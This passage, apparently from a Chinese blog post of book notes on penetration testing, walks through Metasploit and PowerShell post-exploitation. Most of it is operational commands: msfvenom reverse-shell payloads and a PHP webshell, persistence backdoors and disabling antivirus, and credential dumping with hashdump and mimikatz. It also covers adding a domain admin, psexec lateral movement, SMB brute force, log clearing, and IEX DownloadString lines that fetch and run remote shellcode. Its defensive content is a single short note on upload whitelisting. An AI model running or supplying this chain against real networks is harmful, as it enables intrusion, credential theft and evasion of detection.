+<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的PHP的文件，利用时间差完成了webshell的上传。</p>
+<p>防御：</p>
+<ol>
+<li>通过白名单</li>
+<li>对上传的文件进行重命名，例如rand(10,99)data(“Mango”).”.jpg”</li>
+</ol>
+<h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。尝试将一些敏感的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。</p>
+<h4 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h4><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><p>垂直越权（垂直越权是指使用权限低的用户可以访问权限较高的用户）。</p>
+<h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><p>水平越权（水平越权是指相同权限的不同用户可以互相访问）。</p>
+<p>id=1是一个用户信息 改为id=2可以看到另一个用户信息</p>
+<h2 id="第5章-Metasploit技术"><a href="#第5章-Metasploit技术" class="headerlink" title="第5章 Metasploit技术"></a><strong>第5章 Metasploit技术</strong></h2><p>Metasploit是近年来最强大﹑最流行和最有发展前途的开源渗透测试平台软件之一。它完全颠覆了已有的渗透测试方式。本章详细介绍了Metasploit的攻击步骤﹑信息收集﹑漏洞分析﹑漏洞利用﹑权限提升﹑移植漏洞代码模块，以及如何建立后门的实践方法。并通过具体的内网域渗透测试实例，来分析如何通过一个普通的WebShell权限一步一步获取域管权限，最终畅游整个内网。</p>
+<h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>模块是通过Metasploit框架装载集成对外提供的最核心的渗透测试功能实现代码。<br>分为</p>
+<p>Aux（辅助模块）</p>
+<p>Exploit（攻击模块）</p>
+<p>Payloads（攻击载荷模块）</p>
+<p>POST（后期渗透模块）</p>
+<p>Encoders（编码器模块）</p>
+<h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><ul>
+<li>启动metasploit（命令行模式） ：<code>msfconsole</code></li>
+<li>升级metasploit：<code>msfupdate</code></li>
+<li>查看命令使用帮助信息：<code>help [COMMAND]</code></li>
+<li>搜索模块：<code>search</code> [模块名 //(search ms08-067)</li>
+<li>选择模块：<code>use xxx/xxx/xxx</code></li>
+<li>查看模块信息:<code>info</code></li>
+<li>查看攻击载荷：<code>show payloads</code></li>
+<li>设置攻击载荷：<code>set payload xxx/xxx/xxx</code></li>
+<li>查看需要设置的配置参数：<code>show options</code></li>
+<li>设置配置参数：<code>set XXXX xxxxxx</code></li>
+<li>开始攻击：<code>exploit</code></li>
+<li>退出当前模块:<code>back</code></li>
+<li>退出msf : <code>exit</code></li>
+</ul>
+<h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><p>search portscan</p>
+<p>nmap -O -Pn/p0 192.168.11.251 不使用ping 可以穿透防火墙，皮面被防火墙发现</p>
+<h3 id="0x00-进程迁移"><a href="#0x00-进程迁移" class="headerlink" title="0x00 进程迁移"></a>0x00 进程迁移</h3><p>刚获得meterpreter shell时，改shell极其脆弱</p>
+<p>下一步要移动shell使他和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作，这样渗透更难被检测到</p>
+<ol>
+<li><p>meterpreter &gt; ps</p>
+<p> pid   PPID   Name            </p>
+<p> 448  3028  explore.exe</p>
+<p> 984     448     138.exe  </p>
+</li>
+<li><p>meterpreter &gt; geipid 获得meterpreter shell的进程号pid984</p>
+</li>
+<li><p>meterpreter &gt; migrate 448  这样把shell移动到Explore.exe进程里。</p>
+</li>
+<li><p>meterpreter &gt; getpid</p>
+<p> current pid：448</p>
+</li>
+<li><p>进程迁移完成后 原先pid为984会自动关闭 ，如果没有则可输入 kill 984 杀掉</p>
+</li>
+</ol>
+<h3 id="0x01-系统命令"><a href="#0x01-系统命令" class="headerlink" title="0x01 系统命令"></a>0x01 系统命令</h3><p>sysinfo</p>
+<p>run post/windows/gather/checkvm   检查目标机是否允许在虚拟机上</p>
+<p>route 查看完整网络配置</p>
+<p>run post/windows/manage/killav 命令关闭目标机杀毒软件</p>
+<p>run post/windows/manage/enable_rdp 开启目标机远程桌面协议</p>
+<p>run post/windows/manage/autoroute 查看网络结构</p>
+<p>background隐藏meterpreter</p>
+<p>然后输入 route add 命令添加路由，添加成功后输入route print命令查看，</p>
+<p>可以看到192.168.172.0路由已经</p>
+<p>run post/windows/gather/enum_logged_on_users 命令列举当前有多少用户登录了目标机</p>
+<p>run post/windows/gather/enum_applications 列举安装在目标机上的应用程序</p>
+<p>run post/windows/gather/credentials/windows_autologin 抓取字典登录的用户名和密码</p>
+<p>meterpreter &gt;screengrab  抓取目标机的屏幕</p>
+<h4 id="网络摄像头摄像头命令"><a href="#网络摄像头摄像头命令" class="headerlink" title="网络摄像头摄像头命令"></a>网络摄像头摄像头命令</h4><pre><code>webcam_list  #查看摄像头
+webcam_snap   #通过摄像头拍照
+webcam_stream   #通过摄像头开启视频
+</code></pre><p>输入shell 进入目标机shell</p>
+<p>exit 停止meterpreter会话</p>
+<h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><p>search -f *.txt -d c:\  搜索c盘中所有以.txt为扩展名</p>
+<p>download c:\test.txt/root   下载c盘中的test.txt文件到攻击机root下</p>
+<pre><code>upload /tmp/hack.txt C:\ 上传文件到目标机上
+</code></pre><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>meterpreter &gt; shell</p>
+<p>whoami/groups</p>
+<p>getuid 查看已经获得的权限</p>
+<h5 id="1）getsystem提权"><a href="#1）getsystem提权" class="headerlink" title="1）getsystem提权"></a>1）getsystem提权</h5><pre><code>getsystem
+</code></pre><p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名<br>管道.②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接<br>.③Windows服务已启动，导致与命名管道建立连接<br>.④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
+<p>失败使用</p>
+<p>sysinfo查看已打补丁</p>
+<p>search 其他未打补丁的漏洞</p>
+<h6 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h6><p>Token </p>
+<p>kerberos是一种网络认证协议，通过密钥系统为客户端/服务器应用程序提供强大的认证服务：保护服务器防止错误的用户使用，同时保护它的用户使用正确的服务器，即支持双向验证。</p>
+<p>假冒令牌实战</p>
+<ol>
+<li>meterpreter &gt; getuid 查看已获得权限</li>
+<li>meterpreter &gt; getsystem 失败</li>
+<li>meterpreter &gt; use incognito </li>
+<li>list_tokens -u 列出可用的 token，</li>
+<li>impersonate_token ‘NT AUTHORITY\SYSTEM’  #假冒SYSTEM token<br> 或者impersonate_token NT\ AUTHORITY\SYSTEM #不加单引号 需使用\</li>
+</ol>
+<h6 id="获取哈希"><a href="#获取哈希" class="headerlink" title="获取哈希"></a>获取哈希</h6><p>一、hashdump</p>
+<p>run post/windows/gather/smart_hashdump  #从SAM导出密码哈希 需要SYSTEM权限</p>
+<p>二、使用Quarks PwDump  </p>
+<p>三、使用windows credentials editor </p>
+<p>upload /root/wce.exe c:\</p>
+<p>shell</p>
+<p>四、使用mimikatz</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808312334_767.jpg" alt=""></p>
+<h5 id="2）bypassuac"><a href="#2）bypassuac" class="headerlink" title="2）bypassuac"></a>2）bypassuac</h5><p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：</p>
+<pre><code>use exploit/windows/local/bypassuac
+use exploit/windows/local/bypassuac_injection
+use windows/local/bypassuac_vbs
+use windows/local/ask
+</code></pre><p>如使用bypassuac.rb脚本：</p>
+<pre><code>msf &gt; use exploit/windows/local/bypassuac
+msf &gt; set SESSION 2
+msf &gt; run
+</code></pre><p>移植利用github 其他poc</p>
+<ol>
+<li><p>git clone</p>
+</li>
+<li><p>复制 *.rb到/usr/share/metasploit-framework/modules/exploits/windows/smb下，</p>
+</li>
+<li><p>ls查看是否加载完成</p>
+</li>
+<li><p>reload_all</p>
+</li>
+<li><p>search *</p>
+</li>
+<li><p>use  </p>
+</li>
+<li><p>攻击之前先生成一个dll 文件，如果目标机是32就生成32位dll</p>
+</li>
+<li><p>免杀使用powershell下的empire生成dll，</p>
+</li>
+<li><p>64位使用：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.31.147 lport=3333 -f dll -o ~/eternal11.dll</p>
+<p> 32位使用:   msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.147 lport=3333 -f dll -o ~/eternal11.dll</p>
+</li>
+<li><p>exploit</p>
+</li>
+</ol>
+<h3 id="0x03-后门"><a href="#0x03-后门" class="headerlink" title="0x03 后门"></a>0x03 后门</h3><h4 id="后门工具Cymothoa"><a href="#后门工具Cymothoa" class="headerlink" title="后门工具Cymothoa"></a>后门工具Cymothoa</h4><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。由于该工具基于ptrace库，所以适合各种类Unix系统。该工具提供14种攻击载荷，可以实现各种攻击和后门。由于该后门是基于进程注入，所以当原有进程结束，后门也会被关闭。所以，渗透测试必须结合自启动脚本，注入到自启动服务中（如Web服务），才能使Cymothoa的脚本持久有效。</p>
+<p>但是如果进程关闭或者重启，后门就停止运行。</p>
+<ol>
+<li>ps -aux 查看程序的pid （windows使用 tasklist）</li>
+<li>Cymothoa -p（目标进程pid） 982 -s(shellcode编号) 1-y 3333(指定payload服务端口)</li>
+<li>nc -nvv 192.168.31.47 4444</li>
+</ol>
+<h4 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h4><pre><code class="shell"> run persistence -h
+ run persistence -A -S -U -i 60 -p 4231 -r 192.168.172.138
+</code></pre>
+<p>选项：</p>
+<pre><code>-P：设置Payload，默认为windows/meterpreter/reverse_tcp。该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行；
+
+-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；
+
+-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。因此，在非管理员权限或者未进行BypassUAC操作情况下，不推荐使用该参数；
+
+-i：设置反向连接间隔时间，单位为秒。当设置该参数后，目标机器会每隔设置的时间回连一次所设置的ip；
+
+-p：设置反向连接的端口号。即黑阔用来等待连接的端口；
+
+-r：设置反向连接的ip地址。即黑阔用来等待连接的ip；
+</code></pre><p>web后门</p>
+<p>meterpreter后门</p>
+<ol>
+<li><p>msfvenom创建一个webshell     ：msfvenom -p php/meterpreter/reverse_tcp LHOST 192.168.31.247 -f raw &gt; shuteer.php </p>
+</li>
+<li><pre><code> msf &gt; use exploit/multi/handler
+ msf exploit(handler) &gt; set payload windows /meterpreter/reverse_tcp
+ payload =&gt; windows /meterpreter/reverse_tcp
+ msf exploit(handler) &gt; set LHOST 192.168.17.131
+ LHOST =&gt; 192.168.17.131
+ msf exploit(handler) &gt; set LPORT 6666
+ LPORT =&gt; 6666
+ msf exploit(handler) &gt; exploit
+</code></pre></li>
+<li><p>打开<a href="http://127.0.0.1/shuteer.php" target="_blank" rel="external">http://127.0.0.1/shuteer.php</a></p>
+</li>
+<li><p>反弹成功</p>
+</li>
+</ol>
+<p>aspx meterpreter后门</p>
+<ol>
+<li><p>```<br>show payloads</p>
+</li>
+</ol>
+<p>use windows/shell_reverse_tcp</p>
+<p>info</p>
+<p>set lhost</p>
+<p>set lport</p>
+<p>save</p>
+<pre><code>
+1. generate -h
+
+2. generate -t  aspx
+
+3. 上传到目标机c盘
+
+4.
+</code></pre><pre><code>msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows /meterpreter/reverse_tcp
+payload =&gt; windows /meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LHOST 192.168.17.131
+LHOST =&gt; 192.168.17.131
+msf exploit(handler) &gt; set LPORT 6666
+LPORT =&gt; 6666
+msf exploit(handler) &gt; run
+```
+</code></pre><h3 id="0x04-内网域渗透"><a href="#0x04-内网域渗透" class="headerlink" title="0x04 内网域渗透"></a>0x04 内网域渗透</h3><h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>提权 ms17010 ms15078</p>
+<p>使用bypassuac提权（系统当前用户必须在管理员组，用户账号控制uac设置为默认） </p>
+<pre><code>use exploit/windows/local/bypassuac
+
+set session 1
+
+run
+</code></pre><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>ipconfig /all                                          查询本机IP段，所在域等  
+net user                                               本机用户列表    
+net view                                               查询同一域内机器列表    
+net view /domain                                       查询域列表    
+net view /domain:domainname                            查看workgroup域中计算机列表
+net group /domain                                      查询域里面的工作组   
+net group &quot;domain computers&quot; /domain                      查询域内所有的主机名
+net group &quot;domain admins&quot; /domain                      查询域管理员用户组    
+net group &quot;domain controllers&quot; /domain                 查看域控制器(如果有多台) 
+net group &quot;enterprise admins&quot; /domain                      查询企业管理组
+net localgroup administrators                          本机管理员[通常含有域用户]    
+net localgroup administrators /domain                  登录本机的域管理员    
+net localgroup administrators workgroup\user001 /add   域用户添加到本机   
+net user /domain                                       查询域用户    
+net time /domain                                       判断主域，主域服务器都做时间服务器 
+net config workstation                                 当前登录域
+net session                                            查看当前会话 
+net use \\ip\ipc$ pawword /user:username               建立IPC会话[空连接­***] 
+net share                                              查看SMB指向的路径[即共享
+net start                                              查看当前运行的服务 
+net accounts                                           查看本地密码策略 
+net accounts /domain                                   查看域密码策略
+nbtstat –A ip                                          netbios 查询  
+netstat –an/ano/anb                                    网络连接查询  
+route print                                            路由表
+</code></pre><h4 id="ipc-入侵实战"><a href="#ipc-入侵实战" class="headerlink" title="ipc$入侵实战"></a>ipc$入侵实战</h4><p>net use \127.0.0.21\ipc$    连接ipc共享</p>
+<p>copy 1.exe \127.0.0.21\ipc$   复制1.exe到目标主机</p>
+<p>net time  \127.0.0.21 查看服务器上的时间</p>
+<p>at \127.0.0.21 10:50 1.exe <code>at</code>命令来设置定时任务</p>
+<p>反弹meterpreter shell</p>
+<p>handler监听</p>
+<p>sysinfo 查看服务器信息和权限</p>
+<p>getuid  查看权限</p>
+<p>使用mimikatz或者hashdump抓hash</p>
+<p>net use \127.0.0.21 \ipc$ /del 渗透完毕后删掉记录</p>
+<h4 id="powershell寻找域管在线服务器"><a href="#powershell寻找域管在线服务器" class="headerlink" title="powershell寻找域管在线服务器"></a>powershell寻找域管在线服务器</h4><pre><code class="shell">powershell.exe -exec bypass -Command &quot;&amp;{Import-Module .\powerview.ps1;Invoke-UserHunter}&quot;`
+</code></pre>
+<p>获取当域管理员在线登录的服务器，ip</p>
+<p>主机名为pav… ip为…</p>
+<h4 id="获取域管权限"><a href="#获取域管权限" class="headerlink" title="获取域管权限"></a>获取域管权限</h4><p>getsystem  提权</p>
+<p>ps 找到与管理所在的进程</p>
+<p>migrate 进程pid    把meterpreter shell进程迁移此进程</p>
+<p>getuid</p>
+<p>net time 查看主域控ip（一般来说时间服务器都是域服务器）</p>
+<p>得到域服务器的主机名为PAV Ip为10.51.0.11</p>
+<p>使用ipc$ 反弹meterpreter shell</p>
+<p>net user Bigbroke pass /ad /domain 添加用户</p>
+<p>net group “domain admins” /domain 给域控添加管理员</p>
+<h4 id="登录域控制"><a href="#登录域控制" class="headerlink" title="登录域控制"></a>登录域控制</h4><p>具体可以看书</p>
+<p>将最好的方式：使用metasploit下的PsExec反弹meterpreter，</p>
+<p>注意两点</p>
+<ul>
+<li>MSF中的PsExec模块</li>
+<li>cuestom模块，建议使用类似Veil生成免杀payload</li>
+</ul>
+<pre><code class="shell">msf auxiliary(scanner/portscan/tcp) &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; use exploit/windows/smb/psexec
+msf exploit(windows/smb/psexec) &gt; show options 
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOST                                  yes       The target address
+   RPORT                 445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                no        The Windows domain to use for authentication
+   SMBPass                                no        The password for the specified username
+   SMBUser                                no        The username to authenticate as
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(windows/smb/psexec) &gt; set smbuser Bigbroke
+smbuser =&gt; Bigbroke
+msf exploit(windows/smb/psexec) &gt; set smbpass pass
+msf exploit(windows/smb/psexec) &gt; set rhost 10.51.0.11
+rhost =&gt; 10.51.0.11
+msf exploit(windows/smb/psexec) &gt; run
+meterpreter &gt; migrate 2416
+meterpreter &gt; getuid
+meterpreter &gt; getpid
+meterpreter &gt; sysinfo
+</code></pre>
+<p>抓hash（system权限）</p>
+<h4 id="smb爆破内网"><a href="#smb爆破内网" class="headerlink" title="smb爆破内网"></a>smb爆破内网</h4><p>有域控密码 ，接下来内网扩大控制权限</p>
+<ul>
+<li>利用当前获取的域控账号密码，对整个域控ip段扫描</li>
+<li>利用smb下的sm_login模块</li>
+<li>端口转发或者socks代理进内网</li>
+</ul>
+<pre><code>meterpreter &gt; background
+msf exploit(multi/handler) &gt; route add 10.51.0.11 255.255.0.0
+msf exploit(multi/handler) &gt; search smb_login
+msf exploit(multi/handler) &gt; use auxiliary/scanner/smb/smb_login 
+msf auxiliary(scanner/smb/smb_login) &gt; set rhosts
+msf auxiliary(scanner/smb/smb_login) &gt; set smbuser 
+msf auxiliary(scanner/smb/smb_login) &gt; set smbpass
+msf auxiliary(scanner/smb/smb_login) &gt; set smbdomain 
+msf auxiliary(scanner/smb/smb_login) &gt; set threads 16
+msf auxiliary(scanner/smb/smb_login) &gt; set creds
+</code></pre><p>可以使用meterpreter的端口转发，也可以使用metasploit下的 socks4a模块</p>
+<p>meterpreter &gt; portfwd add -l 5555 -p 3389 -r 127.0.0.1</p>
+<h3 id="0x05-清理日志"><a href="#0x05-清理日志" class="headerlink" title="0x05 清理日志"></a>0x05 清理日志</h3><ul>
+<li>删除之前的域管理账号</li>
+<li>删除所有在渗透过程中使用过的工具</li>
+<li>删除应用程序、系统和安全日志</li>
+<li>关闭所有meterpreter</li>
+</ul>
+<p>删除账号</p>
+<pre><code>net user Bigbroke /del
+
+logoff
+</code></pre><p>删除日志</p>
+<p>meterpreter &gt; clearev</p>
+<p>关闭所有msf连接</p>
+<p>msf exploit(psexec) &gt; sessions</p>
+<p>msf exploit(psexec) &gt;  sessions -K</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h3><h2 id="第6章-PowerShell攻击指南"><a href="#第6章-PowerShell攻击指南" class="headerlink" title="第6章 PowerShell攻击指南"></a><strong>第6章 PowerShell攻击指南</strong></h2><p>学习推荐windows powershell 实战指南和三叶草师傅的gitbook<a href="https://legacy.gitbook.com/book/rootclay/powershell-attack-guide/details" target="_blank" rel="external">https://legacy.gitbook.com/book/rootclay/powershell-attack-guide/details</a></p>
+<p>在渗透测试中，PowerShell是不能忽略的一个环节，而且仍在不断地更新和发展，它具有令人难以置信的灵活性和功能化管理Windows系统的能力。PowerShell的众多特点使得它在获得和保持对系统的访问权限时，也成为攻击者首选的攻击手段。本章详细介绍了PowerShell的基本概念和常用命令，以及PowerSploit﹑Empire﹑Nishang等常用PowerShell攻击工具的安装及具体模块的使用，包括生成木马、信息探测、权限提升、横向渗透、凭证窃取、键盘记录、后门持久化等操作。</p>
+<p>常用工具</p>
+<ul>
+<li>powerSplit</li>
+<li>Nishang</li>
+<li>Empire</li>
+<li>PowerCat</li>
+</ul>
+<h3 id="Powershell基础"><a href="#Powershell基础" class="headerlink" title="Powershell基础"></a>Powershell基础</h3><p>powershell的后缀是ps1，哪为什么是ps1而不是ps2,ps3呢？那么理解这个问题呢我们可以看看powershell的特性，powershell是对下完全兼容的，也就是说你使用powershell 5.x的版本来执行powershell v1.0的代码也是完全没有问题的。</p>
+<h4 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h4><p> PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略</p>
+<p>如何绕过这些安全策略，下面提供几种方法，网上还有很多的绕过方法，：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>说明</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Get-ExecutionPolicy</td>
+<td>获取当前的执行策略</td>
+<td></td>
+</tr>
+<tr>
+<td>Get-Content .\test.ps1 \</td>
+<td>powershell.exe -noprofile -</td>
+<td>通过管道输入进ps</td>
+</tr>
+<tr>
+<td>powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.2/test.ps1" target="_blank" rel="external">http://192.168.1.2/test.ps1</a>‘)”</td>
+<td>通过远程下载脚本来绕过</td>
+<td></td>
+</tr>
+<tr>
+<td><code>$command = &quot;Write-Host &#39;Hello World!&#39;&quot; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)  $encodedCommand = [Convert]::ToBase64String($bytes)  powershell.exe -EncodedCommand $encodedCommand</code></td>
+<td>通过BASE64编码执行</td>
+</tr>
+</tbody>
+</table>
+<h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><p>1.直接执行脚本.\shell.ps1</p>
+<p>2.C:\Scripts\shell.ps1</p>
+<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>powershell -ExecutionPolicy Bypass -File .\xxx.ps1 绕过本地权限执行</p>
+<p>powershell -EncodedCommand dwBoAG8AYQBtAGkACgA=</p>
+<p>Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File .\xxx.ps1 本地隐藏绕过权限执行脚本</p>
+<h3 id="Powersploit"><a href="#Powersploit" class="headerlink" title="Powersploit"></a>Powersploit</h3><p>AntivirusBypass:发现杀毒软件的查杀特征</p>
+<p>CodeExecution:在目标机上执行代码</p>
+<p>Exfiltration:目标主机上的信息搜集工具</p>
+<p>Mayhem:蓝屏等破坏性脚本</p>
+<p>Persistence:后门脚本</p>
+<p>Recon:以目标主机为跳板进行内网信息侦查</p>
+<p>ScriptModification：目标主机上创建或修改脚本</p>
+<h4 id="一-执行shellcode反弹meterpreter-shell"><a href="#一-执行shellcode反弹meterpreter-shell" class="headerlink" title="一.执行shellcode反弹meterpreter shell"></a>一.执行shellcode反弹meterpreter shell</h4><p>1.使用msfvenom生成一个powershell脚本。</p>
+<p> <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.125 LPORT=4444 -f powershell -o /var/www/html/test</code></p>
+<p>2.目标机powershell输入以下命令</p>
+<pre><code>IEX(New-ObjectNet.WebClient).DownloadString(&amp;quot;http://192.168.110.129/CodeExecution/Invoke-Shellcode.ps1&amp;quot;)`
+
+IEX (New-ObjectNet.WebClient).DownloadString(&amp;quot;http://192.168.110.129/test&amp;quot;)
+
+Invoke-Shellcode -Shellcode ($buf)
+</code></pre><p>msf反弹成功</p>
+<p>其他扩展可以看先知师傅的</p>
+<p><a href="https://xz.aliyun.com/t/263" target="_blank" rel="external">https://xz.aliyun.com/t/263</a></p>
+<h4 id="绕过杀软执行-invoke-Mimikatz"><a href="#绕过杀软执行-invoke-Mimikatz" class="headerlink" title="绕过杀软执行 invoke-Mimikatz"></a>绕过杀软执行 invoke-Mimikatz</h4><p><a href="https://zhuanlan.zhihu.com/p/24859556" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/24859556</a></p>
+<h3 id="Powerup"><a href="#Powerup" class="headerlink" title="Powerup"></a>Powerup</h3><p>通过脆弱的Windows服务提权；或者通过常见的系统服务，通过其继承的系统权限来完成提权等等，在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。</p>
+<p>加载脚本模块: Import-Module .\PowerUp.ps1</p>
+<p>查看模块的详细说明：Get-Help Invoke-AllChecks -full </p>
+<p>执行所有的脚本来检查: Invoke-AllChecks</p>
+<p>检查当前%PATH%是否存在哪些目录是当前用户可以写入的： Find-PathDLLHijack</p>
+<p>从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码: Get-ApplicationHost</p>
+<p>检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的: Get-RegistryAlwaysInstallElevated</p>
+<p>检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码: Get-RegistryAutoLogon</p>
+<p>获取DHCP服务的详细信息: Get-ServiceDetail -ServiceName Dhcp</p>
+<p>检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的： Get-ServiceFilePermission</p>
+<p>检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象：Test-ServiceDaclPermission</p>
+<p>检查服务路径，返回包含空格但是不带引号的服务路径： Get-ServiceUnquoted</p>
+<p>检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据：Get-UnattendedInstallFile</p>
+<pre><code>c:sysprepsysprep.xml
+c:sysprepsysprep.inf
+c:sysprep.inf
+c:windowsPantherUnattended.xml
+c:windowsPantherUnattendUnattended.xml
+c:windowsPantherUnattend.xml
+c:windowsPantherUnattendUnattend.xml
+c:windowsSystem32Sysprepunattend.xml
+c:windowsSystem32SysprepPantherunattend.xml
+</code></pre><p>检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径： Get-ModifiableRegistryAutoRun</p>
+<p>返回当前用户能够修改的计划任务程序的名称和路径： Get-ModifiableScheduledTaskFile</p>
+<p>返回当前服务器上的web.config文件中的数据库连接字符串的明文：Get-Webconfig</p>
+<p>用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令： </p>
+<pre><code>PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC # 添加默认账号
+PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; # 指定添加域账号
+PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup &quot;Administrators&quot; # 指定添加用户，用户密码以及添加的用户组。
+PS C:&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -Command &quot;net ...&quot;# 自定义执行命令
+</code></pre><p>恢复服务的可执行文件到原始目录：</p>
+<pre><code>Restore-ServiceBinary -ServiceName VulnSVC
+</code></pre><p>检查某个用户是否在一个服务有自由访问控制的权限，返回true或false：Restore-ServiceBinary -ServiceName VulnSVC</p>
+<p>输出一个自定义命令并且能够自删除的bat文件到$env:Tempdebug.bat，并输出一个能够启动这个bat文件的dll：Write-HijackDll</p>
+<p>预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令：</p>
+<pre><code>PS C:&gt;Write-ServiceBinary -ServiceName VulnSVC # 添加默认账号
+PS C:&gt;Write-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot; # 指定添加域账号
+PS C:&gt;Write-ServiceBinary-ServiceName VulnSVC -UserName backdoor -Password Password123! # 指定添加用户，用户密码以及添加的用户组
+PS C:&gt; Write-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot; # 自定义执行命令
+</code></pre><p>通过Write-ServiceBinary写一个C#的服务用来添加用户：</p>
+<pre><code>PS C:&gt; Install-ServiceBinary -ServiceName DHCP
+PS C:&gt; Install-ServiceBinary -ServiceName VulnSVC -UserName &quot;TESTLABjohn&quot;
+PS C:&gt;Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
+PS C:&gt; Install-ServiceBinary -ServiceName VulnSVC -Command &quot;net ...&quot;
+</code></pre><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>篇幅过程细读此两篇文章</p>
+<p><a href="https://www.anquanke.com/post/id/87328" target="_blank" rel="external">https://www.anquanke.com/post/id/87328</a></p>
+<p><a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="external">https://www.anquanke.com/post/id/87333</a></p>
+<p>这里学到的tips在于：在内网抓取的密码比较多又乱的时候，可以通过命令来正对hash/plaintext进行排列，增加，删除，导出等操作，这里我们将凭证存储导出为，输入creds export 目录/xx.csv命令。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>读完此书，学到了很多对于后渗透阶段怎么进行和优化，对于安全，一定不能忘却初心。</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 72382781@qq.com </span>
+    </div>
+</article>
+
+
+<p>
